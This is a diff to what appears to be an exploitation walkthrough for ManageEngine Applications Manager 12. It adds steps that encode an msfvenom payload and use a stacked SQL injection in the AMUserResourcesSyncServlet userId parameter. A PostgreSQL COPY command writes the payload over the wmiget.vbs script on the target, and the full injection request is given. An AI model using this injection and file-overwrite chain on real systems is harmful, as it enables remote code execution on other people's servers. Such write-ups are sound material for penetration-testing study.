@@ -36,3 +36,11 @@ Match and replace roles in Notepad++ (to make the payload oneliner):
 - mach `::` replace with `:` **repeat this multiple times** (remove consecutive conlons and replace it by only one colon)
 3. **Final Payload**
   - We will paste out modified msfvenom payload just before `:WScript.Quit(0):`, as: `Echo serviceData:Next:<PAYLOAD_HERE>:WScript.Quit(0):`
+4. **Write the payload to the target file system using the SQLI**
+    - Encode the payload into Base64 then URL encode it
+    - write it to to `wmiget.vbs` using `copy (select convert_from(decode($$ENCODED_PAYLOAD_HERE$$,$$base64$$),$$utf-8$$)) to $$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;`
+    - Final SQLI query looks like this:
+      ```
+      /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;copy (select convert_from(decode($$ENCODED_PAYLOAD_HERE$$,$$base64$$),$$utf-8$$)) to $$C:\\Program Files (x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;
+      ```
+    - 
